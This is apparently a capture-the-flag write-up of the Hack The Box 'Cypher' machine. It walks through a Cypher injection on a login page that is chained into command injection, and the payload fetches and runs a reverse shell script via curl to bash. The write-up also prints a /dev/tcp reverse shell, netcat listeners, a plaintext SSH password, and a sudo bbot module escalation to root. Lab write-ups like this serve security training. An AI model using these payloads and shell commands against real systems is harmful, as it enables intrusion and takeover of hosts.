<h1>CYPHER WRITE UP</h1>

<img width="697" height="384" alt="cypher" src="https://github.com/user-attachments/assets/4670984f-052e-4342-a96a-3308e1292b2e" /></br>

<h2>MACHINE INFORMATION</h2>

<b>Difficulty:</b> Medium<br>
<b>Operating System:</b> Linux<br>
<b>IP Address:</b> 10.10.11.57<br>
<b>Hostname:</b> cypher.htb<br>
<b>Open Ports:</b> 22/tcp, 80/tcp<br>
<b>Web Server:</b> nginx 1.24.0<br>
<b>Addition:</b> Neo4j<br>

<h2>SUMMARY</h2>

Cypher is a medium-difficulty Linux machine. The attack starts with a Cypher injection vulnerability on the login page, which allows access to the custom web application's query functionality. During directory enumeration, a testing endpoint is discovered containing a custom Java extension. After downloading and decompiling the extension, a command injection vulnerability is identified in one of its functions. This vulnerability is exploited through the Cypher injection to obtain a shell as the <code>neo4j</code> user. Credentials for the <code>graphasm</code> user are then discovered in a configuration file. After connecting through SSH, <code>sudo -l</code> reveals that the user can execute <code>bbot</code> as <code>root</code>. A custom BBOT module is created and executed with sudo, resulting in root access.

<h3>STEP BY STEP</h3>

<b>1-</b> First start with nmap scan.

<code>nmap -sC -sV 10.10.11.57</code>

Result:

<img width="771" height="284" alt="ss1" src="https://github.com/user-attachments/assets/893f6adc-9516-4c61-a0b2-661aa3e9c28f" /></br>

As I can see ports 22(SSH) and 80(HTTP) are open.

<b>2-</b> In the nmap scan result I see the target machine's host name is "cypher.htb". So I add this to my "/etc/hosts" file.

<code>echo "10.10.11.57 cypher.htb" | sudo tee -a /etc/hosts</code>

<b>3-</b> Visit "http://cypher.htb".

I see a website about "Graph ASM". When I read the "About" section, I understand this is an introduction to a node-based network mapping and attack surface displaying application.

<b>4-</b> When I look into the "/login" page source code, I find that they use "Neo4j".

<img width="1366" height="647" alt="ss2" src="https://github.com/user-attachments/assets/c266658c-1b3e-4877-907d-acaba2136d7f" /></br>

In that script they are checking access permissions.

<b>5-</b> I start Gobuster for directory enumeration.

<code>gobuster dir -u http://cypher.htb/ -w ~/Desktop/HTB/SecLists/Discovery/Web-Conten/directory-list-2.3-small.txt</code>

Result:

<img width="938" height="360" alt="ss3" src="https://github.com/user-attachments/assets/a41c9e1e-5702-4f10-bca9-b16af684d35f" /></br>

"/testing" looks interesting.

<b>6-</b> Visit "http://cypher.htb/testing".

<img width="1362" height="206" alt="ss4" src="https://github.com/user-attachments/assets/5adfcdb1-d1e8-4b14-97e0-38432dfcdd54" /></br>

I find and download the "custom-apoc-extension-1.0-SNAPSHOT.jar" file.

<b>7-</b> I extract the files. In the "/custom-apoc-extension-1.0-SNAPSHOT/com/cypher/neo4j/apoc" path, I find "CustomFunctions.class" file. I need to decompile this file to read its source code.

<b>8-</b> To decompile the ".class" file, I need to install "cfr.jar".

<code>wget https://www.benf.org/other/cfr/cfr-0.152.jar -O cfr.jar</code>

After downloading it, I use it with:

<code>java -jar cfr.jar CustomFunctions.class > CustomFunctions.class_decompiled</code>

<code>cat CustomFunctions.class_decompiled</code>

Result:

<img width="1366" height="619" alt="ss5" src="https://github.com/user-attachments/assets/7175fa06-7f0b-496d-a479-af3c8927c172" /></br>

<b>9-</b> In this code an important part catches my eye.

<img width="997" height="25" alt="ss6" src="https://github.com/user-attachments/assets/12f4a584-eef6-47ce-be38-18d2485fd291" /></br>

This part does not have any injection protection, so there is a potential command injection vulnerability.

<b>10-</b> I go back to the website. There is only the "/login" mechanism to try something interesting. I start researching node-based query language attacks and find an attack type called Cypher injection. It is similar to SQL injection, but with different syntax and logic.

To understand this attack vector in more depth, I use the <a href="https://pentester.land/blog/cypher-injection-cheatsheet/">Cypher Injection Cheatsheet</a>.

<b>11-</b> I try to detect the vulnerability. To achieve that, I use values like:

<code>username= '</code>

<code>password= test</code>

Result:

<img width="1366" height="687" alt="ss7" src="https://github.com/user-attachments/assets/82ef0da6-fdf3-4750-a3fb-531396db27cc" /></br>

The system gives me an error. In this error I can see a query. From now on I can try to find a suitable payload.

<b>12-</b> I try many payloads to exploit this vulnerability, but nothing comes out. After some searching and thinking about it, I come up with an idea. What if I try to reach "CustomFunctions.class" just like I can see from "/testing"? Because I have already detected a potential command injection point there.

<b>13-</b> First I prepare my reverse shell script.

<code>vim shell.sh</code>

<code>#!/bin/bash

sh -i >& /dev/tcp/10.10.14.8/9090 0>&1</code>

This is a typical reverse shell connection script. Then I start netcat to listen.

<code>nc -lvnp 9090</code>

<b>14-</b> To execute the script on the target machine, I start an HTTP server.

<code>python3 -m http.server</code>

Now I'm ready to send the payload.

<b>15-</b> The payload is:

<code>test' RETURN h.value AS hash UNION CALL custom.getUrlStatusCode("127.0.0.1; curl http://10.10.14.8:8000/shell.sh | bash") YIELD statusCode AS hash RETURN hash;//</code>

Result:

<img width="1182" height="143" alt="ss8" src="https://github.com/user-attachments/assets/6b0f30c3-838e-444b-92eb-f669ad04e68d" /></br>

And I got the shell.

<b>16-</b> I start information gathering with the "whoami" command. I'm the "neo4j" user. There is not much permission for this user. I go to "/home/graphasm" and find the "bbot_preset.yml" file.

<code>cat bbot_preset.yml</code>

Result:

<img width="340" height="185" alt="ss9" src="https://github.com/user-attachments/assets/f7bf268d-f2d0-43e2-bd49-379056a47a6b" /></br>

In this file I find credentials.

<b>17-</b> I try to connect to SSH with these credentials.

<code>username= graphasm</code>

<code>password= cU4btyib.20xtCMCXkBmerhK</code>

<code>ssh graphasm@cypher.htb</code>

Result:

<img width="954" height="535" alt="ss10" src="https://github.com/user-attachments/assets/70eeec99-f1bd-4d4d-ae72-79e5c06b1829" /></br>

This is how I get the user flag!!!

<b>18-</b> First I look at the sudo permissions for the "graphasm" user.

<code>sudo -l</code>

Result:

<img width="1026" height="99" alt="ss11" src="https://github.com/user-attachments/assets/60426bdf-58eb-40de-b090-d9b1875c81f1" /></br>

As I can see, there is a script called "bbot" and this user can execute it with sudo permissions.

<b>19-</b> I start researching "bbot" and find the <a href="https://github.com/blacklanternsecurity/bbot">GitHub page</a> for this software. On this page I learn that I can write my own custom modules.

When I look at how to write my own module, I also find the <a href="https://www.blacklanternsecurity.com/bbot/Stable/dev/module_howto/">BBOT module documentation</a>.

<b>20-</b> I prepare my preset and module files.

As the preset file, "bash_fnwn_preset.yml":

<img width="274" height="87" alt="ss12" src="https://github.com/user-attachments/assets/5d2aebbd-2894-4908-91db-15006a902f68" /></br>

As the module file, "bash_fnwn.py":

<img width="415" height="260" alt="ss13" src="https://github.com/user-attachments/assets/8b374e2d-6046-402d-8189-2db57f81100b" /></br>

<b>21-</b> Now I just need to send the files to the target system. For this I use netcat.

First for the preset file:

On target system:

<code>nc -lvnp 9090 > bash_fnwn_preset.yml</code>

On my system:

<code>nc 10.10.11.57 9090 < bash_fnwn_preset.yml</code>

Second for the module file:

On target system:

<code>nc -lvnp 9090 > bash_fnwn.py</code>

On my system:

<code>nc 10.10.11.57 9090 < bash_fnwn.py</code>

<img width="289" height="40" alt="ss14" src="https://github.com/user-attachments/assets/72588acf-aedb-4dc6-8763-026fdb0f0730" /></br>

<b>22-</b> From now on I can execute "bbot" as sudo with my preset and module.

<code>sudo bbot --preset ~/bash_fnwn_preset.yml</code>

Result:

<img width="305" height="108" alt="ss15" src="https://github.com/user-attachments/assets/a9383c53-245e-4103-8f6c-ce0694881a9d" /></br>

With that, the system gives me the root shell and this is how I get the root flag!!!

<h2>RESOURCE</h2> <ul> <li><a href="https://pentester.land/blog/cypher-injection-cheatsheet/">CYPHER INJECTION CHEATSHEET</a></li> <li><a href="https://github.com/blacklanternsecurity/bbot">BBOT GITHUB</a></li> <li><a href="https://www.blacklanternsecurity.com/bbot/Stable/dev/module_howto/">BBOT OFFICIAL DOCUMENTATION</a></li> </ul>
